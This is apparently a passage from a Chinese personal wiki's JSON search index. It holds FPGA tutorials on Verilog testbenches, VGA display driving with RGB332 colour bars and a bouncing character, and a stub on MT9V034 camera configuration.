#10 rst_n = 1&#x27;b0;//经过10ns后，rst_n信号拉低 #20 rst_n = 1&#x27;b1;//在10ns后，也就是总共20ns的时候，rst_n信号拉高 endmodule b. 变量的定义赋值及信号类型的定义· 信号类型 wire：用于表示模块之间的连接线，由其他的信号或者模块输出驱动或者使用assign进行赋值 reg：用于存储值，可以在always块或initial块中被赋值。 在我们编写测试模块的时候，通常需要模拟外部信号来驱动功能模块的输入，这些信号通常都要被定义为reg类型 但是对于功能模块的输出，在测试模块中需要定义为wire类型 总的来说，reg 是寄存器类型，用于信号连续或者时序赋值，wire是网线类型，用来各个模块之间的连线。 · 在信号的赋值在initial或者always块中，使用&lt;&#x3D;操作符进行对reg类型信号赋值 · 定义参数形式在代码中，可以将一些频繁需要修改或者在多处使用同一个参数值的地方定义成参数的形式，例如在声明一个计数器的时候 parameter CNT_MAX = 999_999; always (posedge clk) if(!rst_n) cnt &lt;= 20&#x27;d0; else if(cnt == CNT_MAX) cnt &lt;= 20&#x27;d0; else cnt &lt;= cnt + 1&#x27;d1; 3. 简单的测试模块示例module test_module; reg clk; reg reset_n; reg enable; wire output; // 功能模块实例化 my_functional_module uut ( .clk(clk), .reset_n(reset_n), .enable(enable), .output(output) ); // 初始化信号 initial begin clk = 0; reset_n = 0; enable = 0; // 等待一些时钟周期来稳定 #100; // 复位模块 reset_n = 1; // 使能模块并观察输出 #10 enable = 1; #100 enable = 0; // 检查输出是否符合预期 if (output === expected_value) begin $display(&quot;Test passed.&quot;); end else begin $display(&quot;Test failed.&quot;); end // 结束仿真 #100 $finish; end // 时钟信号生成 always #10 clk = ~clk; endmodule 例1：模拟摄像头输入`timescale 1ns / 1ps module test_camera_input; // 假设的RGB565数据输出 wire [15:0] rgb565_data; // 摄像头模块的输入引脚 reg [7:0] data_in; // 8个数据引脚 reg en; // 数据使能引脚 reg clk; // 时钟引脚 // 实例化摄像头模块 camera_module uut ( .data_in(data_in), .en(en), .clk(clk), .rgb565_data(rgb565_data) ); // 摄像头数据模拟 always #10 clk = ~clk; // 产生50Mhz时钟信号 initial begin // 初始化信号 data_in = 8&#x27;b0; en = 0; clk = 0; // 等待一些时钟周期来稳定 #100; // 开始模拟数据输入 en = 1; // 使能数据输入 data_in = 8&#x27;b10001; // 模拟一些数据 #20; // 保持一段时间 // 改变数据 data_in = 8&#x27;b11010; // 模拟新数据 #20; // 保持一段时间 // 禁用数据输入 en = 0; end endmodule"},{"title":"VGA显示器驱动设计","path":"/wiki/FPGA/VGA显示器驱动设计.html","content":"实验结果1 仿真波形 所有工程文件均已开源，获取地址：zikwq&#x2F;FPGA_prj: FPGA_prj (github.com) VGA介绍1. 背景VGA(视频图形阵列)，是一种电脑显示标准，是IBM在1987年提出的一个使用类比讯号的电脑显示标准。个人电脑在加载自己独特的驱动程序之前，都必须支持VGA的标准，绝大多数显卡都带有这种接口。 说到VGA接口，相信很多朋友都不会陌生，因为这种接口是电脑显示器上最主要的接口，从块头巨大的CRT显示器时代开始，VGA接口就被使用，并且一直沿用至今，另外VGA接口还被称为D-Sub接口。 VGA示意图 VGA支持在640x480的较高分辨率下同时显示16种色彩或256种灰度。同时在320x240分辨率下可以同时显示256种颜色。 VGA接口共有15针，分成3排，每排5针。传输红绿蓝模拟信号以及同步信号（场同步和行同步）。使用VGA连接设备，线缆长度最好不要超过10米。 VGA管脚定义图 2. 特征1、是模拟信号的传输，随着显示器的分辨率越高画面就会越模糊。一般模拟信号在超过1280×1024分辨率以上的情况下就会出现明显的误差。 2、因为是模拟信息，信号极其容易受干扰。 3、不能传达音频。 4、一般不加放大器和转换器在30米左右，加放大器和放大转换器可以到150米。 3. 原理图我在进行VGA显示器驱动时，因为我使用的FPGA开发板是至芯z1开发板，而我看到视频教程是在哔哩哔哩中野火FPGA的教程。当时我在跟着视频做完程序后，在配置引脚的时候发现我要传输出去的信号，野火定义了16位宽，而我的开发板原理图只留出来8个引脚，也就是我传输出的数据必须是8位宽的数据才行。 后来我找了一些资料才发现，野火教程里面使用的是RGB565协议，而我的原理图是RGB332协议，所以需要修改对应的输出数据的位宽以及重新使用8位宽定义输出不同的颜色。其实也很简单，只不过想在这里记录一下。因为当天晚上我回到宿舍还硬想了一晚上为啥不一样嘞。今天回到实验室我重新了原理图才明白哈哈 RGB332原理图 RGB565原理图 可以对比看出来，RGB332和RGB565的一些不一样的地方，但是在这两个原理图中，都是使用权电阻网络来驱动VGA的，还有一种方法就是使用AD模数转换芯片来输出模拟信号驱动VGA，常见的AD芯片如：AD7123 RGB信号在使用时的位宽有三种常见格式，以你的VGA解码芯片的配置有关。 1. RGB_8，R：G：B &#x3D; 3：3：2，即RGB332 2. RGB_16，R：G：B &#x3D; 5：6：5，即RGB565 3. RGB_24，R：G：B &#x3D; 8：8：8，即RGB888 4. 时序图VGA显示器扫描方式分为逐行扫描和隔行扫描：逐行扫描是扫描从屏幕左上角一点开始，从左像右逐点扫描，每扫描完一行,电子束回到屏幕的左边下一行的起始位置，在这期间，CRT对电子束进行消隐，每行结束时，用行同步信号进行同步；当扫描完所有的行，形成一帧，用场同步信号进行场同步，并使扫描回到屏幕左上方，同时进行场消隐,开始下一帧。隔行扫描是指电子束扫描时每隔一行扫一线，完成一屏后在返回来扫描剩下的线，隔行扫描的显示器闪烁的厉害，会让使用者的眼睛疲劳。因此我们一般都采用逐行扫描的方式。 扫描方式 VGA时序标准，主要注意的点就是需要一个行同步信号和场同步信号，并且在同步信号开始之后并不直接是有效图像信号，在一个完整的扫描周期中，分为同步、后沿、左边框、有效信号、右边框、前沿。只有在有效信号的部分才是有效信号（说了跟没说一样） 20240504184545 VGA显示模式及相关参数 VGA时序标准 行扫描周期的单位是像素！ 行扫描周期 场扫描周期的单位是行！ 20240504184444 程序设计1. 系统框图20240504184723 一个项目的设计，我们首先需要设计好整个系统的框图，将功能分成模块，然后自下而上一步一步分析。完成一个模块后，进行仿真验证 在这个系统框图里面，我们使用PLL锁相环IP核分出来一个25MHZ的时钟信号作为VGA的时钟，并且输出一个锁定信号locked，将锁定信号和复位信号使用与门连接，其输出作为其他模块的复位信号。 在vga_pic模块中，主要是产生8位宽的图像数据，是根据输入的（x,y）坐标进行确定的。因为我们要在一个显示屏幕上显示10种不同的颜色嘛， vga_ctrl模块，顾名思义，就是一个控制模块，用来输出行场同步信号和图像数据信号 2. 程序设计vga_pic文件 module vga_pic( input wire vga_clk , input wire rst_n, input wire [9:0] pix_x, input wire [9:0] pix_y, output reg [7:0]pix_data ); parameter H_VALID = 10&#x27;d640, V_VALID = 10&#x27;d480; // RGB565协议生成颜色 // parameter RED = 16&#x27;hF800 , // ORANGE = 16&#x27;hFC00 , // YELLOW = 16&#x27;hFFE0 , // GREEN = 16&#x27;h07E0 , // CYAN = 16&#x27;h07EF , // BLUE = 16&#x27;h001F , // PURPPLE = 16&#x27;hF81F , // BLACK = 16&#x27;h0000 , // WHITE = 16&#x27;hFFFF , // GRAY = 16&#x27;hD69A ; // RGB332协议生成颜色 parameter RED = 8&#x27;b11100000; // 16&#x27;hF800 -&gt; 8&#x27;b11100000 parameter ORANGE = 8&#x27;b11111000; // 16&#x27;hFC00 -&gt; 8&#x27;b11111000 parameter YELLOW = 8&#x27;b11111010; // 16&#x27;hFFE0 -&gt; 8&#x27;b11111010 parameter GREEN = 8&#x27;b00100000; // 16&#x27;h07E0 -&gt; 8&#x27;b00100000 parameter CYAN = 8&#x27;b00100011; // 16&#x27;h07EF -&gt; 8&#x27;b00100011 parameter BLUE = 8&#x27;b00011000; // 16&#x27;h001F -&gt; 8&#x27;b00011000 parameter PURPPLE = 8&#x27;b11100001; // 16&#x27;hF81F -&gt; 8&#x27;b11100001 parameter BLACK = 8&#x27;b00000000; // 16&#x27;h0000 -&gt; 8&#x27;b00000000 parameter WHITE = 8&#x27;b11111111; // 16&#x27;hFFFF -&gt; 8&#x27;b11111111 parameter GRAY = 8&#x27;b11010110; // 16&#x27;hD69A -&gt; 8&#x27;b11010110 always @(posedge vga_clk or negedge rst_n) begin if(!rst_n) pix_data &lt;= 8&#x27;d0000; else if((pix_x &gt;=0) &amp;&amp; (pix_x &lt; (H_VALID / 10) * 1)) pix_data &lt;= RED; else if((pix_x &gt;=(H_VALID / 10) * 1) &amp;&amp; (pix_x &lt; (H_VALID / 10) * 2)) pix_data &lt;= ORANGE; else if((pix_x &gt;=(H_VALID / 10) * 2) &amp;&amp; (pix_x &lt; (H_VALID / 10) * 3)) pix_data &lt;= YELLOW; else if((pix_x &gt;=(H_VALID / 10) * 3) &amp;&amp; (pix_x &lt; (H_VALID / 10) * 4)) pix_data &lt;= GREEN; else if((pix_x &gt;=(H_VALID / 10) * 4) &amp;&amp; (pix_x &lt; (H_VALID / 10) * 5)) pix_data &lt;= CYAN; else if((pix_x &gt;=(H_VALID / 10) * 5) &amp;&amp; (pix_x &lt; (H_VALID / 10) * 6)) pix_data &lt;= BLUE; else if((pix_x &gt;=(H_VALID / 10) * 6) &amp;&amp; (pix_x &lt; (H_VALID / 10) * 7)) pix_data &lt;= PURPPLE; else if((pix_x &gt;=(H_VALID / 10) * 7) &amp;&amp; (pix_x &lt; (H_VALID / 10) * 8)) pix_data &lt;= BLACK; else if((pix_x &gt;=(H_VALID / 10) * 8) &amp;&amp; (pix_x &lt; (H_VALID / 10) * 9)) pix_data &lt;= WHITE; else if((pix_x &gt;=(H_VALID / 10) * 9) &amp;&amp; (pix_x &lt; H_VALID)) pix_data &lt;= GRAY; else pix_data &lt;= BLACK; end endmodule vga_ctrl文件 module vga_ctrl( input wire vga_clk , input wire rstn , input wire [15:0] pix_data , // 显示数据 output wire [9:0] pix_x , // x轴有效坐标位置 output wire [9:0] pix_y , // y轴有效坐标位置 output wire hsync , // 行同步信号 output wire vsync , // 场同步信号 output wire [7:0] vga_rgb ); parameter H_SYNC = 10&#x27;d96 , H_BACK = 10&#x27;d40 , H_LEFT = 10&#x27;d8 , H_VALID = 10&#x27;d640 , H_RIGHT = 10&#x27;d8 , H_FRONT = 10&#x27;d8 , H_TOTAL = 10&#x27;d800 ; parameter V_SYNC = 10&#x27;d2 , V_BACK = 10&#x27;d25 , V_TOP = 10&#x27;d8 , V_VALID = 10&#x27;d480 , V_BOTTOM= 10&#x27;d8 , V_FRONT = 10&#x27;d2 , V_TOTAL = 10&#x27;d525 ; reg [9:0] cnt_h ; reg [9:0] cnt_v ; wire rgb_valid ; wire pix_data_req ; // cnt_h行计数器，计数范围0-799 always @(posedge vga_clk or negedge rstn) begin if(!rstn) cnt_h &lt;= 10&#x27;d0; else if (cnt_h == H_TOTAL-1&#x27;d1) cnt_h &lt;= 10&#x27;d0; else cnt_h &lt;= cnt_h + 1&#x27;d1; end // cnt_v列计数器，计数范围0-524并且行计数器计数到799 always @(posedge vga_clk or negedge rstn) begin if(!rstn) cnt_v &lt;= 10&#x27;d0; else if ((cnt_h == H_TOTAL-1&#x27;d1) &amp;&amp; (cnt_v == V_TOTAL - 1&#x27;d1)) cnt_v &lt;= 10&#x27;d0; else if(cnt_h == H_TOTAL-1&#x27;d1) cnt_v &lt;= cnt_v + 1&#x27;d1; else cnt_v &lt;= cnt_v; end // 定义有效数据范围， assign rgb_valid = ((cnt_h &gt;= H_SYNC + H_BACK + H_LEFT) &amp;&amp; (cnt_h &lt; H_SYNC + H_BACK + H_LEFT + H_VALID) &amp;&amp; (cnt_v &gt;= V_SYNC + V_BACK + V_TOP) &amp;&amp; (cnt_v &lt; V_SYNC + V_BACK + V_TOP + V_VALID)) ? 1&#x27;d1 : 1&#x27;d0; assign pix_data_req = ((cnt_h &gt;= H_SYNC + H_BACK + H_LEFT - 1&#x27;d1) &amp;&amp; (cnt_h &lt; H_SYNC + H_BACK + H_LEFT + H_VALID -1&#x27;d1) &amp;&amp; (cnt_v &gt;= V_SYNC + V_BACK + V_TOP) &amp;&amp; (cnt_v &lt; V_SYNC + V_BACK + V_TOP + V_VALID)) ? 1&#x27;d1 : 1&#x27;d0; assign pix_x = (pix_data_req == 1&#x27;d1) ? (cnt_h - (H_SYNC + H_BACK + H_LEFT - 1&#x27;d1)) : 10&#x27;h3ff; assign pix_y = (pix_data_req == 1&#x27;d1) ? (cnt_v - (V_SYNC + V_BACK + V_TOP)) : 10&#x27;h3ff; assign hsync = (cnt_h &lt;= H_SYNC - 1&#x27;d1) ? 1&#x27;d1 : 1&#x27;d0; assign vsync = (cnt_v &lt;= V_SYNC - 1&#x27;d1) ? 1&#x27;d1 : 1&#x27;d0; assign vga_rgb = (rgb_valid == 1&#x27;d1) ? pix_data : 8&#x27;h0000; endmodule tb_vga_ctrl 仿真文件，在仿真的时候，将仿真时间设计成17ms即可 `timescale 1ns/1ps module tb_vga_ctrl (); reg clk ; reg rstn ; wire [15:0] pix_data; wire vga_clk; wire locked; wire rst_n; wire [9:0] pix_x ; wire [9:0] pix_y ; wire hsync ; wire vsync ; wire [15:0] vga_rgb ; initial begin clk = 1&#x27;d1; rstn = 1&#x27;d0; # 20 rstn = 1&#x27;d1; end always #10 clk = ~clk; // always @(posedge vga_clk or negedge rstn) begin // if(!rstn) // pix_data &lt;= 16&#x27;h0000; // else if((pix_x &gt;=0 &amp;&amp; pix_x &lt;= 639) // &amp;&amp; (pix_y &gt;= 0 &amp;&amp; pix_y &lt;= 479)) // pix_data &lt;= 16&#x27;hffff; // else // pix_data &lt;= 16&#x27;h0000; // end // 实例化PLL clk_gen clk_gen_inst ( .areset ( ~rstn ), .inclk0 ( clk ), .c0 ( vga_clk ), .locked ( locked ) ); assign rst_n = locked &amp;&amp; rstn; // 实例化控制模块 vga_ctrl vga_ctrl_init( .vga_clk (vga_clk) , .rstn (rst_n) , .pix_data (pix_data) , // 显示数据 .pix_x (pix_x ) , // x轴有效坐标位置 .pix_y (pix_y ) , // y轴有效坐标位置 .hsync (hsync ) , // 行同步信号 .vsync (vsync ) , // 场同步信号 .vga_rgb (vga_rgb) ); vga_pic vga_pic_inst( . vga_clk(vga_clk) , . rst_n (rst_n) , . pix_x (pix_x) , . pix_y (pix_y) , .pix_data(pix_data) ); endmodule 顶层文件：vga_colorb.v module vga_colorb( input wire clk, input wire rstn, output wire hsync, output wire vsync, output wire [7:0] vga_rgb ); wire vga_clk ; wire locked ; wire rst_n ; wire [9:0] pix_x ; wire [9:0] pix_y ; wire [7:0] pix_data; assign rst_n = (rstn &amp;&amp; locked); // 实例化PLL clk_gen clk_gen_inst ( .areset ( ~rstn ), .inclk0 ( clk ), .c0 ( vga_clk ), .locked ( locked ) ); // 实例化控制模块 vga_ctrl vga_ctrl_init( .vga_clk (vga_clk) , .rstn (rst_n) , .pix_data (pix_data) , // 显示数据 .pix_x (pix_x ) , // x轴有效坐标位置 .pix_y (pix_y ) , // y轴有效坐标位置 .hsync (hsync ) , // 行同步信号 .vsync (vsync ) , // 场同步信号 .vga_rgb (vga_rgb) ); vga_pic vga_pic_inst( . vga_clk(vga_clk) , . rst_n (rst_n) , . pix_x (pix_x) , . pix_y (pix_y) , .pix_data(pix_data) ); endmodule 参考资料VGA、DVI、HDMI区别 - 知乎 (zhihu.com) FPGA基础之VGA（一）满屏红色_vga_hs-CSDN博客 VGA接口_百度百科 (baidu.com)"},{"title":"fpga的mt9v034摄像头配置及hdmi显示输出","path":"/wiki/FPGA/fpga的mt9v034摄像头配置及hdmi显示输出.html","content":"参考链接第46.1讲 MT9V034-LCD显示实验摄像头简介_哔哩哔哩_bilibili 【开源骚客】基于FPGA的摄像头视频显示系统（SDRAM第二季）_哔哩哔哩_bilibili 使用板卡：米联客MZ7030FA，ZYNQ系列开发板 开发环境：VIVADO21.1 摄像头：正点原子的MT9V034摄像头模块 在使用开发板来开发摄像头模块的时候，我们需要为FPGA开发板绘制转接PCB子板， 这里我很简单的绘制了一版如下： 版本1,2层板，2*30,2mm排针转接 版本2，6层板，包含5V转3.3V电路输出 如果需要，请在主页右侧公告栏给我发邮件。 效果演示理论基础MT9V034是是一款1&#x2F;3英寸单芯片图像传感器，能实现最快60fps VGA分辨率的图像采集，具有全局曝光和高动态范围（HDR）操作。实现了CCD图像质量的低噪声和CMOS成像技术（基于信噪比和低光灵敏度），输出的数据是10bit数据，在实现时候需要将高8位数据提取出来进行相应的处理。支持彩色和灰度显示。 实战演练程序设计"},{"title":"为什么时序逻辑需要滞后一个时钟周期","path":"/wiki/FPGA/为什么时序逻辑需要滞后一个时钟周期.html","content":"开发中···为什么时序逻辑需要滞后一个时钟周期.md"},{"title":"VGA显示器驱动--字符游走","path":"/wiki/FPGA/VGA显示器驱动--字符游走.html","content":"起因项目的起因是在刷哔哩哔哩的时候看到了一个视频 【2023全国大学生FPGA创新设计大赛-国一】紫光同创-视频处理魔盒_哔哩哔哩_bilibili 当时对于我这个小白来说，羡慕的死死的~~~ 当即就在我的日记本上记下了这个项目，立誓要Copy一个~，但实在是太厉害了，我计划一点一点的分模块来完成吧，毕竟我现在也刚开始学习FPGA才2个多月，慢慢来吧 展示 Your browser does not support the video tag. 起始这个功能并不难实现，具体的实现思路都在这篇文章里面写的很清楚了，感兴趣的就可以点进去慢慢看。FPGA：VGA显示器驱动设计 - quincy的日记 如果很难看懂的话，可以看下我文章末尾的一个参考链接，FPGA就是他带我入门的。 这里只说一下注意的点吧： 首先这个程序是一个纯verilog程序实现的，当然这里用到了一个PLL锁相环，将我的50MHZ系统时钟进行分频，输出一个25MHZ的时钟频率。（为什么请看上面的那篇文章） 字模是使用的字模提取的软件来提取的16进制数据 注意字体显示的区域和你显示器的分辨率，这里是640*480的显示分辨率 代码vga_colorb.vmodule vga_colorb( input wire clk, input wire rstn, output wire hsync, output wire vsync, output wire [7:0] vga_rgb ); wire vga_clk ; wire locked ; wire rst_n ; wire [9:0] pix_x ; wire [9:0] pix_y ; wire [7:0] pix_data; assign rst_n = (rstn &amp;&amp; locked); // 实例化PLL clk_gen clk_gen_inst ( .areset ( ~rstn ), .inclk0 ( clk ), .c0 ( vga_clk ), .locked ( locked ) ); // 实例化控制模块 vga_ctrl vga_ctrl_init( .vga_clk (vga_clk) , .rstn (rst_n) , .pix_data (pix_data) , // 显示数据 .pix_x (pix_x ) , // x轴有效坐标位置 .pix_y (pix_y ) , // y轴有效坐标位置 .hsync (hsync ) , // 行同步信号 .vsync (vsync ) , // 场同步信号 .vga_rgb (vga_rgb) ); vga_pic vga_pic_inst( . vga_clk(vga_clk) , . rst_n (rst_n) , . pix_x (pix_x) , . pix_y (pix_y) , .pix_data(pix_data) ); endmodule vga_pic.vmodule vga_pic( input wire vga_clk ,//25MHZ input wire rst_n, input wire [9:0] pix_x, input wire [9:0] pix_y, output reg [7:0]pix_data ); reg [255:0] char [63:0]; wire [9:0] char_x; wire [9:0] char_y; reg [9:0] CHAR_B_H, CHAR_B_V; // 字符需要显示的位置 parameter CHAR_W = 10&#x27;d256, // 字符的宽度 CHAR_H = 10&#x27;d64; // 字符的高度 parameter BLACK = 8&#x27;b00000000; // RGB332色彩格式 parameter RED = 8&#x27;b11100000; // assign char_x = (((pix_x &gt;= CHAR_B_H) &amp;&amp; (pix_x &lt; (CHAR_B_H + CHAR_W))) &amp;&amp; ((pix_y &gt;= CHAR_B_V) &amp;&amp; (pix_y &lt; (CHAR_B_V +CHAR_H)))) ? (pix_x - CHAR_B_H) : 10&#x27;h3ff; assign char_y = (((pix_x &gt;= CHAR_B_H) &amp;&amp; (pix_x &lt; (CHAR_B_H + CHAR_W))) &amp;&amp; ((pix_y &gt;= CHAR_B_V) &amp;&amp; (pix_y &lt; (CHAR_B_V +CHAR_H)))) ? (pix_y - CHAR_B_V) : 10&#x27;h3ff; // 分频时钟，因为前面的程序用到了PLL锁相环，所以无法使用50MHZ的系统时钟进行分频，这里使用锁相环输出的25MHZ进行分频 reg [27:0] cnt_500; reg clk_500; always @(posedge vga_clk or negedge rst_n) begin if(!rst_n) begin cnt_500 &lt;= 28&#x27;d0; clk_500 &lt;= 1&#x27;d0; end else if(cnt_500 == 28&#x27;d200000) begin cnt_500 &lt;= 28&#x27;d0; clk_500 &lt;= ~clk_500; end else begin cnt_500 &lt;= cnt_500 + 1&#x27;d1; end end // 典型错误的运动程序， // always @(posedge clk_500 or negedge rst_n) begin // if(!rst_n) begin // CHAR_B_H &lt;= 10&#x27;d0; // CHAR_B_V &lt;= 10&#x27;d0; // EN_work &lt;= 1&#x27;d0; // end else if(EN_work == 1&#x27;d0) begin // CHAR_B_H &lt;= CHAR_B_H + 1&#x27;d1; // CHAR_B_V &lt;= CHAR_B_V + 1&#x27;d1; // end else if(EN_work == 1&#x27;d1) begin // CHAR_B_H &lt;=CHAR_B_H -1&#x27;d1; // CHAR_B_V &lt;=CHAR_B_V -1&#x27;d1; // end else if((CHAR_B_H == 10&#x27;d382) || (CHAR_B_V == 10&#x27;d412)) begin // EN_work &lt;= 1&#x27;d1; // end else if((CHAR_B_H == 10&#x27;d0) || (CHAR_B_V == 10&#x27;d0)) begin // EN_work &lt;= 1&#x27;d0; // end // end reg [1:0] dir_h; // 0的时候右移，1的时候左边=移 reg [1:0] dir_v; // 0的时候上移，1的时候下移 always @(posedge clk_500 or negedge rst_n) begin if(!rst_n) begin CHAR_B_H &lt;= 10&#x27;d0; // 初始化字符水平位置 CHAR_B_V &lt;= 10&#x27;d0; // 初始化字符垂直位置 dir_h &lt;= 2&#x27;b0; // 初始化水平方向 dir_v &lt;= 2&#x27;b0; // 初始化垂直方向 end else begin if (dir_h == 2&#x27;b0) begin // 向右运动 CHAR_B_H &lt;= CHAR_B_H + 1&#x27;d1; if (CHAR_B_H == 10&#x27;d382) begin dir_h &lt;= 2&#x27;b1; // 到达边界，改变运动方向 end end else begin // 左移动 CHAR_B_H &lt;= CHAR_B_H - 1&#x27;d1; if (CHAR_B_H == 10&#x27;d0) begin dir_h &lt;= 2&#x27;b0; // 到达边界，改变运动方向 end end if (dir_v == 2&#x27;b0) begin // 向下运动 CHAR_B_V &lt;= CHAR_B_V + 1&#x27;d1; if (CHAR_B_V == 10&#x27;d412) begin dir_v &lt;= 2&#x27;b1; // 到达边界，改变运动方向 end end else begin // 向上运动 CHAR_B_V &lt;= CHAR_B_V - 1&#x27;d1; if (CHAR_B_V == 10&#x27;d0) begin dir_v &lt;= 2&#x27;b0; // 到达边界，改变运动方向 end end end end // 使用字符取模软件，提取“创新科技”的16进制字模数据 always @ (posedge vga_clk) begin char[0] &lt;= 256&#x27;h 0000000000000000000000000000000000000000000000000000000000000000; char[1] &lt;= 256&#x27;h 0000000000000000000000000000000000000000000000000000000000000000; char[2] &lt;= 256&#x27;h 0000000000000000000000000000000000000000000000000000000000000000; char[3] &lt;= 256&#x27;h 0000000000000000000000000000000000000000000000000000000000000000; char[4] &lt;= 256&#x27;h 000000000000000000003C000000000000000000070000000001C00040000000; char[5] &lt;= 256&#x27;h 000000000038000000001F00000000000000000003E000000000F00078000000; char[6] &lt;= 256&#x27;h 00003800003E000000000F00000000000000060003E000000000F8007E000000; char[7] &lt;= 256&#x27;h 00003C00001F000000000700007000000000078001E000000000F0003E000000; char[8] &lt;= 256&#x27;h 00003E00001F000000000300007C000000000FC001E000000000F0003C000000; char[9] &lt;= 256&#x27;h 00003E00000F00000000000000FE000000001F8001C000000000F0003C000000; char[10] &lt;= 256&#x27;h00003C00000F0000000000E001FC000000003E0001C000000000E0003C000000; char[11] &lt;= 256&#x27;h00003C00000F0000000007F807C000000000780001C000000000E0003C000000; char[12] &lt;= 256&#x27;h00007800000E000000003FE00F0000000000E00001C000000000E00038000000; char[13] &lt;= 256&#x27;h00007C00000E0000000FFE003C0000000003C001C1C000000000E00038000000; char[14] &lt;= 256&#x27;h0000F780000E0000000FC301F000000000077001F1C000000000E000387C0000; char[15] &lt;= 256&#x27;h0000F3E0000E000000000381E000000000187800F1C000000000E0003FFC0000; char[16] &lt;= 256&#x27;h0001E1F83C0E0000000003C1E00000000000700071C000000000E0007FF00000; char[17] &lt;= 256&#x27;h0001C0FC1E0E000000030380E00000000000700011C000000000E007FFC00000; char[18] &lt;= 256&#x27;h0003C07C1E0E000000038300E00000000000700001C000000000FF1FFE000000; char[19] &lt;= 256&#x27;h0003803E1E06000000038600E0000000000033C001C00000000FFE0FF8000000; char[20] &lt;= 256&#x27;h0007001C1E06000000018600E003E00000003FE001C0000000FFF00030000000; char[21] &lt;= 256&#x27;h000700000E06000000008FF8E03FF0000001FE0781C0000000FFE00030000000; char[22] &lt;= 256&#x27;h000E00000E06000000007FE0E3FFF000001FF003C1C000000000E00030000000; char[23] &lt;= 256&#x27;h001C00000E060000000FF800FFE0000003FF7001E1C000000000E00030000000; char[24] &lt;= 256&#x27;h003803000E0600000FFF7000E0E000001FF8F000E1C000000000E00030000000; char[25] &lt;= 256&#x27;h00300FC00E0600000FF07800E0F000000FE0F00041C000000000E20033800000; char[26] &lt;= 256&#x27;h006FFFE00E06000003003800E0F000000301F00001C0F8000000EC003FE00000; char[27] &lt;= 256&#x27;h00C7C1F00E07000000003860C0F000000003F80001DFFC000000F801FFE00000; char[28] &lt;= 256&#x27;h018701E00E07000000003FF1C07000000003FF0003FFFC000000F07FE3E00000; char[29] &lt;= 256&#x27;h030701C00E0700000000FF81C0700000000777807FF800000001E07F03C00000; char[30] &lt;= 256&#x27;h060701C01E07000001FFF801C0700000000E73BFFFC000000003E00003C00000; char[31] &lt;= 256&#x27;h080701C01E07000000FE3801C0700000001C707FE1C000000007E00003800000; char[32] &lt;= 256&#x27;h000701C01E07000000003801C0700000001C700C01C00000001EE03C03800000; char[33] &lt;= 256&#x27;h000701C01E07000000003F01C07000000038700001C00000007CE01E03800000; char[34] &lt;= 256&#x27;h00071FC01C07000000303BC1807000000070700001C0000001F8E00707000000; char[35] &lt;= 256&#x27;h00070F800C070000003039E38070000000E0700001C000000FF0E00387000000; char[36] &lt;= 256&#x27;h000707800C070000007038E38070000001C0700001C000000FC0E001C7000000; char[37] &lt;= 256&#x27;h000707800007000000703863807000000300700001C000000780E000EE000000; char[38] &lt;= 256&#x27;h000703000007000000F03807007000000600700001C000000300E0007E000000; char[39] &lt;= 256&#x27;h000702040007000000E03807007000000800700001C000000000E0003C000000; char[40] &lt;= 256&#x27;h000700060007000000E03806006000001000700001C000000000E0007E000000; char[41] &lt;= 256&#x27;h000700060007000000E3780E006000000000700001C000000000E000FF800000; char[42] &lt;= 256&#x27;h00030006000F000000C1F81C006000000000700001C000000000E001F7C00000; char[43] &lt;= 256&#x27;h0003800E020F00000000F818006000000000700001C000000000E007C3F00000; char[44] &lt;= 256&#x27;h0003C03E01FF000000007830006000000000F00001C00000001FE01F81FC0000; char[45] &lt;= 256&#x27;h0003FFFE00FF000000003060006000000000F00001C000000007E0FC00FF8000; char[46] &lt;= 256&#x27;h0001FFFE007F000000000000006000000000700001C000000003E3E0007FF000; char[47] &lt;= 256&#x27;h00007FF8007E000000000000006000000000600001C000000001C000003FFC00; char[48] &lt;= 256&#x27;h00000000003E000000000000006000000000600001C000000001C00000000000; char[49] &lt;= 256&#x27;h00000000003C000000000000006000000000200001C000000000800000000000; char[50] &lt;= 256&#x27;h0000000000180000000000000040000000000000018000000000000000000000; char[51] &lt;= 256&#x27;h0000000000000000000000000040000000000000008000000000000000000000; char[52] &lt;= 256&#x27;h0000000000000000000000000000000000000000008000000000000000000000; char[53] &lt;= 256&#x27;h0000000000000000000000000000000000000000000000000000000000000000; char[54] &lt;= 256&#x27;h0000000000000000000000000000000000000000000000000000000000000000; char[55] &lt;= 256&#x27;h0000000000000000000000000000000000000000000000000000000000000000; char[56] &lt;= 256&#x27;h0000000000000000000000000000000000000000000000000000000000000000; char[57] &lt;= 256&#x27;h0000000000000000000000000000000000000000000000000000000000000000; char[58] &lt;= 256&#x27;h0000000000000000000000000000000000000000000000000000000000000000; char[59] &lt;= 256&#x27;h0000000000000000000000000000000000000000000000000000000000000000; char[60] &lt;= 256&#x27;h0000000000000000000000000000000000000000000000000000000000000000; char[61] &lt;= 256&#x27;h0000000000000000000000000000000000000000000000000000000000000000; char[62] &lt;= 256&#x27;h0000000000000000000000000000000000000000000000000000000000000000; char[63] &lt;= 256&#x27;h0000000000000000000000000000000000000000000000000000000000000000; end // 如果扫描到了要显示的像素，则赋值给红色，否则赋值给黑色 always@(posedge vga_clk or negedge rst_n) if(rst_n == 1&#x27;b0) pix_data &lt;= BLACK; else if((((pix_x &gt;= (CHAR_B_H - 1&#x27;b1)) &amp;&amp; (pix_x &lt; (CHAR_B_H + CHAR_W -1&#x27;b1))) &amp;&amp; ((pix_y &gt;= CHAR_B_V) &amp;&amp; (pix_y &lt; (CHAR_B_V + CHAR_H)))) &amp;&amp; (char[char_y][10&#x27;d255 - char_x] == 1&#x27;b1)) pix_data &lt;= RED; else pix_data &lt;= BLACK; endmodule vga_ctrl.vmodule vga_ctrl( input wire vga_clk , input wire rstn , input wire [15:0] pix_data , // 显示数据 output wire [9:0] pix_x , // x轴有效坐标位置 output wire [9:0] pix_y , // y轴有效坐标位置 output wire hsync , // 行同步信号 output wire vsync , // 场同步信号 output wire [7:0] vga_rgb ); parameter H_SYNC = 10&#x27;d96 , H_BACK = 10&#x27;d40 , H_LEFT = 10&#x27;d8 , H_VALID = 10&#x27;d640 , H_RIGHT = 10&#x27;d8 , H_FRONT = 10&#x27;d8 , H_TOTAL = 10&#x27;d800 ; parameter V_SYNC = 10&#x27;d2 , V_BACK = 10&#x27;d25 , V_TOP = 10&#x27;d8 , V_VALID = 10&#x27;d480 , V_BOTTOM= 10&#x27;d8 , V_FRONT = 10&#x27;d2 , V_TOTAL = 10&#x27;d525 ; reg [9:0] cnt_h ; reg [9:0] cnt_v ; wire rgb_valid ; wire pix_data_req ; // cnt_h行计数器，计数范围0-799 always @(posedge vga_clk or negedge rstn) begin if(!rstn) cnt_h &lt;= 10&#x27;d0; else 